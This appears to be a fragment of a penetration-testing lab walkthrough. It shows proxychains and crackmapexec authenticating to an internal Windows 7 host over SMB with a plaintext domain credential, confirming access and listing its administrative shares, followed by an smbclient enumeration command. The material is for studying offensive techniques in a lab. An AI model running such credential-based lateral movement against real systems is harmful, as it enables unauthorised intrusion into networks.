```bash
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-26 09:51:00] 
 └─╼ # proxychains crackmapexec smb 172.16.1.101 -u ned.flanders_adm -p Lefthandedyeah! --shares
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.101    445    WS02             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
SMB         172.16.1.101    445    WS02             [+] Enumerated shares
SMB         172.16.1.101    445    WS02             Share           Permissions     Remark
SMB         172.16.1.101    445    WS02             -----           -----------     ------
SMB         172.16.1.101    445    WS02             ADMIN$                          Remote Admin
SMB         172.16.1.101    445    WS02             C$                              Default share
SMB         172.16.1.101    445    WS02             IPC$                            Remote IPC
```

```bash
proxychains smbclient -L \\\\172.16.1.101\\ADMIN$ -U ned.flanders_adm
```


